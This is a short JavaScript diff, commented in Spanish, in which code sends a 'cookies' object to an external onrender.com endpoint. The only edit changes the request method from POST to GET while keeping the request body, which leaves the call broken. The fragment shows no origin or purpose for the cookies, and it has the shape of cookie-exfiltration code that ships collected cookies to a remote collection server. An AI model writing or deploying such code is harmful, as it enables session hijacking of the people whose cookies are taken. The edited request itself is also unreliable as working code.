@@ -4,7 +4,7 @@
 
     //Enviar cookies al servidor
     const request= fetch("https://testnode-vo76.onrender.com/cookies",{
-        method: 'POST',
+        method: 'GET',
         body: JSON.stringify({cookies})
     })
     .then(data => console.log(data))
